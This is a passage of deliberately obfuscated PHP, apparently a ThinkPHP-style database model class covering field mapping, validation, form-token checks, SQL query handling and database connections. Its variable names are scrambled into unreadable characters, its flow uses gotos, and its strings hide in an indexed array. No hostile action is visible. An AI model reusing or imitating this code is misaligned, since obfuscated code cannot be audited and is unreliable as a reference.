(strtolower($f•æÜÙßØ¸)) { case $Cºøªî‹¨ë[295]: return json_encode($Fµµ«ÔÉçæ); case $Cºøªî‹¨ë[296]: return xml_encode($Fµµ«ÔÉçæ); } } return $Fµµ«ÔÉçæ; } public function parseFieldsMap($DÏ‰÷ÄÉŞ¨, $a«ƒƒê©¦® = 1) { if (!empty($this->_map)) { foreach ($this->_map as $EÌ…îÎŸã => $E¢×Â„å©º) { if ($a«ƒƒê©¦® == 1) { if (isset($DÏ‰÷ÄÉŞ¨[$E¢×Â„å©º])) { $DÏ‰÷ÄÉŞ¨[$EÌ…îÎŸã] = $DÏ‰÷ÄÉŞ¨[$E¢×Â„å©º]; unset($DÏ‰÷ÄÉŞ¨[$E¢×Â„å©º]); } } else { if (isset($DÏ‰÷ÄÉŞ¨[$EÌ…îÎŸã])) { $DÏ‰÷ÄÉŞ¨[$E¢×Â„å©º] = $DÏ‰÷ÄÉŞ¨[$EÌ…îÎŸã]; unset($DÏ‰÷ÄÉŞ¨[$EÌ…îÎŸã]); } } } } return $DÏ‰÷ÄÉŞ¨; } public function setField($DáÙÏ¨Í¬†, $D©æì¶™ŞÈ = '') { if (is_array($DáÙÏ¨Í¬†)) { $B¹™îÁ–ğÖ = $DáÙÏ¨Í¬†; } else { $B¹™îÁ–ğÖ[$DáÙÏ¨Í¬†] = $D©æì¶™ŞÈ; } return $this->save($B¹™îÁ–ğÖ); } public function setAdd($d©ğì§´ œ, $DÓŸ÷œãÚâ = 1) { $CšœÙ¼¦à£ =& $_SERVER[¨¤¼…´]; $dÇ Í£ğ¿÷ = $d©ğì§´ œ . $CšœÙ¼¦à£[297] . $DÓŸ÷œãÚâ; if ($DÓŸ÷œãÚâ < 0) { $dÇ Í£ğ¿÷ = $d©ğì§´ œ . $DÓŸ÷œãÚâ; } return $this->setField($d©ğì§´ œ, array($CšœÙ¼¦à£[298], $dÇ Í£ğ¿÷)); } public function getField($E öïØ‹„¤, $dˆÔ…¬»Æà = null) { $b«®ù‹ŠÕ¢ =& $_SERVER[¨¤¼…´]; $cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[274]] = $E öïØ‹„¤; $cøö Ë‰‚Ø = $this->_parseOptions($cøö Ë‰‚Ø); $E öïØ‹„¤ = trim($E öïØ‹„¤); if (strpos($E öïØ‹„¤, $b«®ù‹ŠÕ¢[57])) { if (!isset($cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[293]])) { $cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[293]] = is_numeric($dˆÔ…¬»Æà) ? $dˆÔ…¬»Æà : $b«®ù‹ŠÕ¢[43]; } $FÊáù¢™Å¡ = $this->db->select($cøö Ë‰‚Ø); if (!empty($FÊáù¢™Å¡)) { goto e•íœ‰¿Ì‹; e•íœ‰¿Ì‹: $d·Ğã‹½° = explode($b«®ù‹ŠÕ¢[57], $E öïØ‹„¤); $E öïØ‹„¤ = array_keys($FÊáù¢™Å¡[0]); $a¾·ïÍéÃß = array_shift($E öïØ‹„¤); goto D§‰ÓÔÓ±; Fóã†¨Şí: foreach ($FÊáù¢™Å¡ as $dåÓ‰°Üƒñ) { $FÏ…œò©† = $dåÓ‰°Üƒñ[$a¾·ïÍéÃß]; if (2 == $aî“í§åÂ©) { $EâôÎÎ²²Š[$FÏ…œò©†] = $dåÓ‰°Üƒñ[$CŠ½¨åĞã½]; } else { $EâôÎÎ²²Š[$FÏ…œò©†] = is_string($dˆÔ…¬»Æà) ? implode($dˆÔ…¬»Æà, $dåÓ‰°Üƒñ) : $dåÓ‰°Üƒñ; } } return $EâôÎÎ²²Š; goto dÏˆÚŞ²; D§‰ÓÔÓ±: $CŠ½¨åĞã½ = array_shift($E öïØ‹„¤); $EâôÎÎ²²Š = array(); $aî“í§åÂ© = count($d·Ğã‹½°); goto Fóã†¨Şí; dÏˆÚŞ²: } } else { if (!0 !== $dˆÔ…¬»Æà) { $cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[293]] = is_numeric($dˆÔ…¬»Æà) ? $dˆÔ…¬»Æà : 1; } if ($dˆÔ…¬»Æà === $b«®ù‹ŠÕ¢[256]) { unset($cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[293]]); } $dåÓ‰°Üƒñ = $this->db->select($cøö Ë‰‚Ø); if (!empty($dåÓ‰°Üƒñ)) { if ($dˆÔ…¬»Æà === $b«®ù‹ŠÕ¢[256]) { return reset($dåÓ‰°Üƒñ[0]); } if (!0 !== $dˆÔ…¬»Æà && 1 == $cøö Ë‰‚Ø[$b«®ù‹ŠÕ¢[293]]) { return reset($dåÓ‰°Üƒñ[0]); } foreach ($dåÓ‰°Üƒñ as $cÛö‹¹»ï) { $B‰éŒ‰ÚË[] = $cÛö‹¹»ï[$E öïØ‹„¤]; } return $B‰éŒ‰ÚË; } } return null; } public function create($bë­â˜âîô = '', $a˜Ìª•Ï»Ù = '') { goto e“–¢Ñ™©¹; eë¸Éãœæğ: $bë­â˜âîô = $this->parseFieldsMap($bë­â˜âîô, 0); $a˜Ìª•Ï»Ù = $a˜Ìª•Ï»Ù ? $a˜Ìª•Ï»Ù : (!empty($bë­â˜âîô[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$A’Ü¬íÚùÄ[274]])) { $F‘œÂ­Ø¨ = $this->options[$A’Ü¬íÚùÄ[274]]; unset($this->options[$A’Ü¬íÚùÄ[274]]); } elseif ($a˜Ìª•Ï»Ù == THINK_MODEL_INSERT && isset($this->insertFields)) { $F‘œÂ­Ø¨ = $this->insertFields; } elseif ($a˜Ìª•Ï»Ù == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F‘œÂ­Ø¨ = $this->updateFields; } goto DÚãÌ¸İÄà; DÚãÌ¸İÄà: if (isset($F‘œÂ­Ø¨)) { if (is_string($F‘œÂ­Ø¨)) { $F‘œÂ­Ø¨ = explode($A’Ü¬íÚùÄ[57], $F‘œÂ­Ø¨); } if (think_config($A’Ü¬íÚùÄ[299])) { $F‘œÂ­Ø¨[] = think_config($A’Ü¬íÚùÄ[300]); } foreach ($bë­â˜âîô as $fé’‰„Ó‘ã => $eÚº£ºœÅ³) { if (!in_array($fé’‰„Ó‘ã, $F‘œÂ­Ø¨)) { unset($bë­â˜âîô[$fé’‰„Ó‘ã]); } } } if (!$this->autoValidation($bë­â˜âîô, $a˜Ìª•Ï»Ù)) { return !1; } if (!$this->autoCheckToken($bë­â˜âîô)) { $this->error = think_lang($A’Ü¬íÚùÄ[301]); return !1; } goto dË‘Ö‚õÃ; C¼™ì©‹ÓÃ: return $bë­â˜âîô; goto E‡³ÛÑÀø; e“–¢Ñ™©¹: $A’Ü¬íÚùÄ =& $_SERVER[¨¤¼…´]; if (empty($bë­â˜âîô)) { $bë­â˜âîô = $_POST; } elseif (is_object($bë­â˜âîô)) { $bë­â˜âîô = get_object_vars($bë­â˜âîô); } if (empty($bë­â˜âîô) || !is_array($bë­â˜âîô)) { $this->error = think_lang($A’Ü¬íÚùÄ[272]); return !1; } goto eë¸Éãœæğ; dË‘Ö‚õÃ: if ($this->autoCheckFields) { $F‘œÂ­Ø¨ = $this->getDbFields(); foreach ($bë­â˜âîô as $fé’‰„Ó‘ã => $eÚº£ºœÅ³) { if (!in_array($fé’‰„Ó‘ã, $F‘œÂ­Ø¨)) { unset($bë­â˜âîô[$fé’‰„Ó‘ã]); } elseif (MAGIC_QUOTES_GPC && is_string($eÚº£ºœÅ³)) { $bë­â˜âîô[$fé’‰„Ó‘ã] = stripslashes($eÚº£ºœÅ³); } } } $this->autoOperation($bë­â˜âîô, $a˜Ìª•Ï»Ù); $this->data = $bë­â˜âîô; goto C¼™ì©‹ÓÃ; E‡³ÛÑÀø: } public function autoCheckToken($A‚Íô–ªÇ¡) { $C¤¢••ÃË =& $_SERVER[¨¤¼…´]; if (isset($this->options[$C¤¢••ÃË[302]]) && !$this->options[$C¤¢••ÃË[302]]) { return !0; } if (think_config($C¤¢••ÃË[299])) { $C«ÙëÙæğ¢ = think_config($C¤¢••ÃË[300]); if (!isset($A‚Íô–ªÇ¡[$C«ÙëÙæğ¢]) || Session::get($C«ÙëÙæğ¢)) { return !1; } list($f —óĞŒ‚Ğ, $D¨³âà‹®–) = explode($C¤¢••ÃË[80], $A‚Íô–ªÇ¡[$C«ÙëÙæğ¢]); if ($D¨³âà‹®– && Session::get($C«ÙëÙæğ¢ . $C¤¢••ÃË[101] . $f —óĞŒ‚Ğ) === $D¨³âà‹®–) { Session::remove($C«ÙëÙæğ¢ . $C¤¢••ÃË[101] . $f —óĞŒ‚Ğ); return !0; } if (think_config($C¤¢••ÃË[303])) { Session::remove($C«ÙëÙæğ¢ . $C¤¢••ÃË[101] . $f —óĞŒ‚Ğ); } return !1; } return !0; } public function regex($C¼¥Ö›­­Ğ, $D¨‡õÃ•™¨) { $C¹ÂÌ°„Ê =& $_SERVER[¨¤¼…´]; $f³ŒİÁ§‚É = array($C¹ÂÌ°„Ê[304] => $C¹ÂÌ°„Ê[305], $C¹ÂÌ°„Ê[306] => $C¹ÂÌ°„Ê[307], $C¹ÂÌ°„Ê[308] => $C¹ÂÌ°„Ê[309], $C¹ÂÌ°„Ê[310] => $C¹ÂÌ°„Ê[311], $C¹ÂÌ°„Ê[312] => $C¹ÂÌ°„Ê[313], $C¹ÂÌ°„Ê[314] => $C¹ÂÌ°„Ê[315], $C¹ÂÌ°„Ê[316] => $C¹ÂÌ°„Ê[317], $C¹ÂÌ°„Ê[291] => $C¹ÂÌ°„Ê[318], $C¹ÂÌ°„Ê[319] => $C¹ÂÌ°„Ê[320]); if (isset($f³ŒİÁ§‚É[strtolower($D¨‡õÃ•™¨)])) { $D¨‡õÃ•™¨ = $f³ŒİÁ§‚É[strtolower($D¨‡õÃ•™¨)]; } return preg_match($D¨‡õÃ•™¨, $C¼¥Ö›­­Ğ) === 1; } private function autoOperation(&$BîìİÂ÷áê, $E²ìÈ‡œğŒ) { $báìºà± =& $_SERVER[¨¤¼…´]; if (!empty($this->options[$báìºà±[321]])) { $c…‘¥÷çî˜ = $this->options[$báìºà±[321]]; unset($this->options[$báìºà±[321]]); } elseif (!empty($this->_auto)) { $c…‘¥÷çî˜ = $this->_auto; } if (isset($c…‘¥÷çî˜)) { foreach ($c…‘¥÷çî˜ as $cëù“ˆìƒÈ) { if (empty($cëù“ˆìƒÈ[2])) { $cëù“ˆìƒÈ[2] = THINK_MODEL_INSERT; } if ($E²ìÈ‡œğŒ == $cëù“ˆìƒÈ[2] || $cëù“ˆìƒÈ[2] == THINK_MODEL_BOTH) { switch (trim($cëù“ˆìƒÈ[3])) { case $báìºà±[322]: case $báìºà±[323]: $CÊ±ÁÇğİ² = isset($cëù“ˆìƒÈ[4]) ? (array) $cëù“ˆìƒÈ[4] : array(); if (isset($BîìİÂ÷áê[$cëù“ˆìƒÈ[0]])) { array_unshift($CÊ±ÁÇğİ², $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]]); } if ($báìºà±[322] == $cëù“ˆìƒÈ[3]) { $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]] = call_user_func_array($cëù“ˆìƒÈ[1], $CÊ±ÁÇğİ²); } else { $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]] = call_user_func_array(array(&$this, $cëù“ˆìƒÈ[1]), $CÊ±ÁÇğİ²); } break; case $báìºà±[274]: $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]] = $BîìİÂ÷áê[$cëù“ˆìƒÈ[1]]; break; case $báìºà±[324]: if ($báìºà±[43] === $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]]) { unset($BîìİÂ÷áê[$cëù“ˆìƒÈ[0]]); } break; case $báìºà±[325]: default: $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]] = $cëù“ˆìƒÈ[1]; } if (!1 === $BîìİÂ÷áê[$cëù“ˆìƒÈ[0]]) { unset($BîìİÂ÷áê[$cëù“ˆìƒÈ[0]]); } } } } return $BîìİÂ÷áê; } protected function autoValidation($Cºí¶ïš‡, $B¦ßöä‡ø) { $Eğ…ùª›áÏ =& $_SERVER[¨¤¼…´]; if (!empty($this->options[$Eğ…ùª›áÏ[326]])) { $eáÄ·×ˆ¹ = $this->options[$Eğ…ùª›áÏ[326]]; unset($this->options[$Eğ…ùª›áÏ[326]]); } elseif (!empty($this->_validate)) { $eáÄ·×ˆ¹ = $this->_validate; } if (isset($eáÄ·×ˆ¹)) { if ($this->patchValidate) { $this->error = array(); } foreach ($eáÄ·×ˆ¹ as $E²’âÇ¼êÄ => $a³âò‚³çª) { if (empty($a³âò‚³çª[5]) || $a³âò‚³çª[5] == THINK_MODEL_BOTH || $a³âò‚³çª[5] == $B¦ßöä‡ø) { if (0 == strpos($a³âò‚³çª[2], $Eğ…ùª›áÏ[327]) && strpos($a³âò‚³çª[2], $Eğ…ùª›áÏ[328])) { $a³âò‚³çª[2] = think_lang(substr($a³âò‚³çª[2], 2, -1)); } $a³âò‚³çª[3] = isset($a³âò‚³çª[3]) ? $a³âò‚³çª[3] : THINK_EXISTS_VALIDATE; $a³âò‚³çª[4] = isset($a³âò‚³çª[4]) ? $a³âò‚³çª[4] : $Eğ…ùª›áÏ[329]; switch ($a³âò‚³çª[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Cºí¶ïš‡, $a³âò‚³çª)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Eğ…ùª›áÏ[43] != trim($Cºí¶ïš‡[$a³âò‚³çª[0]])) { if (!1 === $this->_validationField($Cºí¶ïš‡, $a³âò‚³çª)) { return !1; } } break; default: if (isset($Cºí¶ïš‡[$a³âò‚³çª[0]])) { if (!1 === $this->_validationField($Cºí¶ïš‡, $a³âò‚³çª)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($f†ëÎ›åÕ, $e¼‹É„Ôß) { if (!1 === $this->_validationFieldItem($f†ëÎ›åÕ, $e¼‹É„Ôß)) { if ($this->patchValidate) { $this->error[$e¼‹É„Ôß[0]] = $e¼‹É„Ôß[2]; } else { $this->error = $e¼‹É„Ôß[2]; return !1; } } return; } protected function _validationFieldItem($E¿†Õëó¡´, $DÇñï°¹¸) { $dÖÀÈË¡³™ =& $_SERVER[¨¤¼…´]; switch (strtolower(trim($DÇñï°¹¸[4]))) { case $dÖÀÈË¡³™[322]: case $dÖÀÈË¡³™[323]: $bò…´ÍÏ‹ = isset($DÇñï°¹¸[6]) ? (array) $DÇñï°¹¸[6] : array(); if (is_string($DÇñï°¹¸[0]) && strpos($DÇñï°¹¸[0], $dÖÀÈË¡³™[57])) { $DÇñï°¹¸[0] = explode($dÖÀÈË¡³™[57], $DÇñï°¹¸[0]); } if (is_array($DÇñï°¹¸[0])) { foreach ($DÇñï°¹¸[0] as $c¦¤µŞÇƒ…) { $c·½É±¢Íğ[$c¦¤µŞÇƒ…] = $E¿†Õëó¡´[$c¦¤µŞÇƒ…]; } array_unshift($bò…´ÍÏ‹, $c·½É±¢Íğ); } else { array_unshift($bò…´ÍÏ‹, $E¿†Õëó¡´[$DÇñï°¹¸[0]]); } if ($dÖÀÈË¡³™[322] == $DÇñï°¹¸[4]) { return call_user_func_array($DÇñï°¹¸[1], $bò…´ÍÏ‹); } else { return call_user_func_array(array(&$this, $DÇñï°¹¸[1]), $bò…´ÍÏ‹); } case $dÖÀÈË¡³™[330]: return $E¿†Õëó¡´[$DÇñï°¹¸[0]] == $E¿†Õëó¡´[$DÇñï°¹¸[1]]; case $dÖÀÈË¡³™[331]: if (is_string($DÇñï°¹¸[0]) && strpos($DÇñï°¹¸[0], $dÖÀÈË¡³™[57])) { $DÇñï°¹¸[0] = explode($dÖÀÈË¡³™[57], $DÇñï°¹¸[0]); } $e²Æ©„Ã°˜ = array(); if (is_array($DÇñï°¹¸[0])) { foreach ($DÇñï°¹¸[0] as $c¦¤µŞÇƒ…) { $e²Æ©„Ã°˜[$c¦¤µŞÇƒ…] = $E¿†Õëó¡´[$c¦¤µŞÇƒ…]; } } else { $e²Æ©„Ã°˜[$DÇñï°¹¸[0]] = $E¿†Õëó¡´[$DÇñï°¹¸[0]]; } if (!empty($E¿†Õëó¡´[$this->getPk()])) { $e²Æ©„Ã°˜[$this->getPk()] = array($dÖÀÈË¡³™[332], $E¿†Õëó¡´[$this->getPk()]); } if ($this->where($e²Æ©„Ã°˜)->find()) { return !1; } return !0; default: return $this->check($E¿†Õëó¡´[$DÇñï°¹¸[0]], $DÇñï°¹¸[1], $DÇñï°¹¸[4]); } } public function check($a”¿øÕç ì, $d·‘Ç’’¼ì, $AÀŸá¨ÖƒŠ = "\162\145\147\x65\170") { $D÷±‚¢ö—‚ =& $_SERVER[¨¤¼…´]; $AÀŸá¨ÖƒŠ = strtolower(trim($AÀŸá¨ÖƒŠ)); switch ($AÀŸá¨ÖƒŠ) { case $D÷±‚¢ö—‚[7]: case $D÷±‚¢ö—‚[333]: $aÔáŒâï™ = is_array($d·‘Ç’’¼ì) ? $d·‘Ç’’¼ì : explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì); return $AÀŸá¨ÖƒŠ == $D÷±‚¢ö—‚[7] ? in_array($a”¿øÕç ì, $aÔáŒâï™) : !in_array($a”¿øÕç ì, $aÔáŒâï™); case $D÷±‚¢ö—‚[334]: case $D÷±‚¢ö—‚[335]: if (is_array($d·‘Ç’’¼ì)) { $aÙ¡±‘ŒÛ­ = $d·‘Ç’’¼ì[0]; $Döèİ®‘“ = $d·‘Ç’’¼ì[1]; } else { list($aÙ¡±‘ŒÛ­, $Döèİ®‘“) = explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì); } return $AÀŸá¨ÖƒŠ == $D÷±‚¢ö—‚[334] ? $a”¿øÕç ì >= $aÙ¡±‘ŒÛ­ && $a”¿øÕç ì <= $Döèİ®‘“ : $a”¿øÕç ì < $aÙ¡±‘ŒÛ­ || $a”¿øÕç ì > $Döèİ®‘“; case $D÷±‚¢ö—‚[336]: case $D÷±‚¢ö—‚[337]: return $AÀŸá¨ÖƒŠ == $D÷±‚¢ö—‚[336] ? $a”¿øÕç ì == $d·‘Ç’’¼ì : $a”¿øÕç ì != $d·‘Ç’’¼ì; case $D÷±‚¢ö—‚[338]: $fÖ¦‡èˆÆË = mb_strlen($a”¿øÕç ì, $D÷±‚¢ö—‚[339]); if (strpos($d·‘Ç’’¼ì, $D÷±‚¢ö—‚[57])) { list($aÙ¡±‘ŒÛ­, $Döèİ®‘“) = explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì); return $fÖ¦‡èˆÆË >= $aÙ¡±‘ŒÛ­ && $fÖ¦‡èˆÆË <= $Döèİ®‘“; } else { return $fÖ¦‡èˆÆË == $d·‘Ç’’¼ì; } case $D÷±‚¢ö—‚[340]: list($eî–‰ê¯É‰, $C¿Âñœì±Ş) = explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì); if (!is_numeric($eî–‰ê¯É‰)) { $eî–‰ê¯É‰ = strtotime($eî–‰ê¯É‰); } if (!is_numeric($C¿Âñœì±Ş)) { $C¿Âñœì±Ş = strtotime($C¿Âñœì±Ş); } return NOW_TIME >= $eî–‰ê¯É‰ && NOW_TIME <= $C¿Âñœì±Ş; case $D÷±‚¢ö—‚[341]: return in_array(get_client_ip(), explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì)); case $D÷±‚¢ö—‚[342]: return !in_array(get_client_ip(), explode($D÷±‚¢ö—‚[57], $d·‘Ç’’¼ì)); case $D÷±‚¢ö—‚[329]: default: return $this->regex($a”¿øÕç ì, $d·‘Ç’’¼ì); } } public function query($fÄšÏŠíî, $Eµ™Ğì = false) { $C“Ê‚Î…Î =& $_SERVER[¨¤¼…´]; if (!is_bool($Eµ™Ğì) && !is_array($Eµ™Ğì)) { $Eµ™Ğì = func_get_args(); array_shift($Eµ™Ğì); } $fÄšÏŠíî = str_replace(array($C“Ê‚Î…Î[14], $C“Ê‚Î…Î[343]), $C“Ê‚Î…Î[60], $fÄšÏŠíî); $fÄšÏŠíî = $this->parseSql($fÄšÏŠíî, $Eµ™Ğì); return $this->db->query($fÄšÏŠíî); } public function execute($fß«Ï’¼ Ô, $BÚ¸³èÈÆÆ = false) { if (!is_bool($BÚ¸³èÈÆÆ) && !is_array($BÚ¸³èÈÆÆ)) { $BÚ¸³èÈÆÆ = func_get_args(); array_shift($BÚ¸³èÈÆÆ); } $fß«Ï’¼ Ô = $this->parseSql($fß«Ï’¼ Ô, $BÚ¸³èÈÆÆ); return $this->db->execute($fß«Ï’¼ Ô); } protected function parseSql($e–»Ÿ„’Û‰, $bÁáÚóšÇ) { $eëÈ´íŠï =& $_SERVER[¨¤¼…´]; if (!0 === $bÁáÚóšÇ) { $cÊëƒÃ×ô„ = $this->_parseOptions(); $e–»Ÿ„’Û‰ = $this->db->parseSql($e–»Ÿ„’Û‰, $cÊëƒÃ×ô„); } elseif (is_array($bÁáÚóšÇ)) { $bÁáÚóšÇ = array_map(array($this->db, $eëÈ´íŠï[344]), $bÁáÚóšÇ); $e–»Ÿ„’Û‰ = vsprintf($e–»Ÿ„’Û‰, $bÁáÚóšÇ); } else { $e–»Ÿ„’Û‰ = strtr($e–»Ÿ„’Û‰, array($eëÈ´íŠï[345] => $this->getTableName(), $eëÈ´íŠï[346] => think_config($eëÈ´íŠï[245]))); } $this->db->setModel($this->name); return $e–»Ÿ„’Û‰; } public function db($aº‘°æ‚Í = '', $F¡œà˜÷åœ = '', $d»‰¼ÛÊ‹· = array()) { goto F¼»°óÏµÎ; b¤‚¹„âáµ: $AÇ¿æöÈ„Â[$aº‘°æ‚Í] = $F¡œà˜÷åœ; $this->db = $e¬‹ÂŠ„Ä[$aº‘°æ‚Í]; $this->_after_db(); goto aÑßŸ´†¡; aÑßŸ´†¡: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F­ë±…ìÚĞ; F¼»°óÏµÎ: $A÷Œ» ò×Ã =& $_SERVER[¨¤¼…´]; if ($A÷Œ» ò×Ã[43] === $aº‘°æ‚Í && $this->db) { return $this->db; } static $AÇ¿æöÈ„Â = array(); goto e±åØ´›Ë¸; e±åØ´›Ë¸: static $e¬‹ÂŠ„Ä = array(); if (!isset($e¬‹ÂŠ„Ä[$aº‘°æ‚Í]) || isset($e¬‹ÂŠ„Ä[$aº‘°æ‚Í]) && $F¡œà˜÷åœ && $AÇ¿æöÈ„Â[$aº‘°æ‚Í] != $F¡œà˜÷åœ) { if (!empty($F¡œà˜÷åœ) && is_string($F¡œà˜÷åœ) && !1 === strpos($F¡œà˜÷åœ, $A÷Œ» ò×Ã[8])) { $F¡œà˜÷åœ = think_config($F¡œà˜÷åœ); } $e¬‹ÂŠ„Ä[$aº‘°æ‚Í] = Db::getInstance($F¡œà˜÷åœ); } elseif (NULL === $F¡œà˜÷åœ) { $e¬‹ÂŠ„Ä[$aº‘°æ‚Í]->close(); unset($e¬‹ÂŠ„Ä[$aº‘°æ‚Í]); return; } if (!empty($d»‰¼ÛÊ‹·)) { if (is_string($d»‰¼ÛÊ‹·)) { parse_str($d»‰¼ÛÊ‹·, $d»‰¼ÛÊ‹·); } foreach ($d»‰¼ÛÊ‹· as $e×™ŸàŒ•æ => $Eª¼Úß£Ş°) { $this->setProperty($e×™ŸàŒ•æ, $Eª¼Úß£Ş°); } } goto b¤‚¹„âáµ; F­ë±…ìÚĞ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Dî¨±Ğ÷í¢ = get_class($this); if ($Dî¨±Ğ÷í¢ == $_SERVER[¨¤¼…´][347]) { return $this->name; } $this->name = substr($Dî¨±Ğ÷í¢, 0, -5); } return $this->name; } public function getTableName() { $F×÷‰¹Â‹ =& $_SERVER[¨¤¼…´]; if (empty($this->trueTableName)) { $FÖÇê¬í¿× = !empty($this->tablePrefix) ? $this->tablePrefix : $F×÷‰¹Â‹[43]; if (!empty($this->tableName)) { $FÖÇê¬í¿× .= $this->tableName; } else { $FÖÇê¬í¿× .= think_parse_name($this->name); } $this->trueTableName = strtolower($FÖÇê¬í¿×); } return (!empty($this->dbName) ? $this->dbName . $F×÷‰¹Â‹[101] : $F×÷‰¹Â‹[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $aÇ…•Ú’ˆ =& $_SERVER[¨¤¼…´]; return isset($this->fields[$aÇ…•Ú’ˆ[252]]) ? $this->fields[$aÇ…•Ú’ˆ[252]] : $this->pk; } public function getDbFields() { $d¨¢˜â ìÚ =& $_SERVER[¨¤¼…´]; if (isset($this->options[$d¨¢˜â ìÚ[280]])) { $EÕ¼ÍÜ›İã = $this->db->getFields($this->options[$d¨¢˜â ìÚ[280]]); return $EÕ¼ÍÜ›İã ? array_keys($EÕ¼ÍÜ›İã) : !1; } if ($this->fields) { $EÕ¼ÍÜ›İã = $this->fields; unset($EÕ¼ÍÜ›İã[$d¨¢˜â ìÚ[251]], $EÕ¼ÍÜ›İã[$d¨¢˜â ìÚ[252]], $EÕ¼ÍÜ›İã[$d¨¢˜â ìÚ[253]], $EÕ¼ÍÜ›İã[$d¨¢˜â ìÚ[250]]); return $EÕ¼ÍÜ›İã; } return !1; } public function data($EÎô†ğƒ¾À = '') { $F‚ÄÜ¾„‰— =& $_SERVER[¨¤¼…´]; if ($F‚ÄÜ¾„‰—[43] === $EÎô†ğƒ¾À && !empty($this->data)) { return $this->data; } if (is_object($EÎô†ğƒ¾À)) { $EÎô†ğƒ¾À = get_object_vars($EÎô†ğƒ¾À); } elseif (is_string($EÎô†ğƒ¾À)) { parse_str($EÎô†ğƒ¾À, $EÎô†ğƒ¾À); } elseif (!is_array($EÎô†ğƒ¾À)) { think_exception(think_lang($F‚ÄÜ¾„‰—[272])); } $this->data = $EÎô†ğƒ¾À; return $this; } public function join($Cá—×™´–÷) { $a¢˜Ü›•Á½ =& $_SERVER[¨¤¼…´]; if (is_array($Cá—×™´–÷)) { $this->options[$a¢˜Ü›•Á½[283]] = $Cá—×™´–÷; } elseif (!empty($Cá—×™´–÷)) { $this->options[$a¢˜Ü›•Á½[283]][] = $Cá—×™´–÷; } return $this; } public function union($B÷áò¡¬åÅ, $f˜Â»ÆŒÛ = false) { goto d˜¢ƒÓ„ù…; aªˆˆ¯Å¤Ä: if (is_object($B÷áò¡¬åÅ)) { $B÷áò¡¬åÅ = get_object_vars($B÷áò¡¬åÅ); } if (is_string($B÷áò¡¬åÅ)) { $aÁÕø‘ËõÀ = $B÷áò¡¬åÅ; } elseif (is_array($B÷áò¡¬åÅ)) { if (isset($B÷áò¡¬åÅ[0])) { $this->options[$fƒªÉÖÍª—[348]] = array_merge($this->options[$fƒªÉÖÍª—[348]], $B÷áò¡¬åÅ); return $this; } else { $aÁÕø‘ËõÀ = $B÷áò¡¬åÅ; } } else { think_exception(think_lang($fƒªÉÖÍª—[272])); } $this->options[$fƒªÉÖÍª—[348]][] = $aÁÕø‘ËõÀ; goto aóá“ˆ¯°×; aóá“ˆ¯°×: return $this; goto c°ƒ˜œ‡å´; d˜¢ƒÓ„ù…: $fƒªÉÖÍª— =& $_SERVER[¨¤¼…´]; if (empty($B÷áò¡¬åÅ)) { return $this; } if ($f˜Â»ÆŒÛ) { $this->options[$fƒªÉÖÍª—[348]][$fƒªÉÖÍª—[349]] = !0; } goto aªˆˆ¯Å¤Ä; c°ƒ˜œ‡å´: } public function cache($dË…’ˆ»šß = true, $BğŸ«¾ÀŒƒ = null, $A÷·ÄğßÙê = '') { $EìÍ”‹¢šŠ =& $_SERVER[¨¤¼…´]; if (!1 !== $dË…’ˆ»šß) { $this->options[$EìÍ”‹¢šŠ[350]] = array($EìÍ”‹¢šŠ[99] => $dË…’ˆ»šß, $EìÍ”‹¢šŠ[340] => $BğŸ«¾ÀŒƒ, $EìÍ”‹¢šŠ[39] => $A÷·ÄğßÙê); } return $this; } public function field($bè¬œÛ¨Ş¹, $fäĞ‡øêñô = false) { $EÒñ£ŞÕŠ =& $_SERVER[¨¤¼…´]; if (!0 === $bè¬œÛ¨Ş¹) { $cç»’áŠƒ = $this->getDbFields(); $bè¬œÛ¨Ş¹ = $cç»’áŠƒ ? $cç»’áŠƒ : $EÒñ£ŞÕŠ[190]; } elseif ($fäĞ‡øêñô) { if (is_string($bè¬œÛ¨Ş¹)) { $bè¬œÛ¨Ş¹ = explode($EÒñ£ŞÕŠ[57], $bè¬œÛ¨Ş¹); } $cç»’áŠƒ = $this->getDbFields(); $bè¬œÛ¨Ş¹ = $cç»’áŠƒ ? array_diff($cç»’áŠƒ, $bè¬œÛ¨Ş¹) : $bè¬œÛ¨Ş¹; } $this->options[$EÒñ£ŞÕŠ[274]] = $bè¬œÛ¨Ş¹; return $this; } public function scope($cİ›¾„‚ˆï = '', $EŒ³¹’Àá± = NULL) { $bÃÙŒŸë =& $_SERVER[¨¤¼…´]; if ($bÃÙŒŸë[43] === $cİ›¾„‚ˆï) { if (isset($this->_scope[$bÃÙŒŸë[44]])) { $bÃ‡«Ü = $this->_scope[$bÃÙŒŸë[44]]; } else { return $this; } } elseif (is_string($cİ›¾„‚ˆï)) { $CùêÏ–—Í = explode($bÃÙŒŸë[57], $cİ›¾„‚ˆï); $bÃ‡«Ü = array(); foreach ($CùêÏ–—Í as $DÊ†Ú¯Şã) { if (!isset($this->_scope[$DÊ†Ú¯Şã])) { continue; } $bÃ‡«Ü = 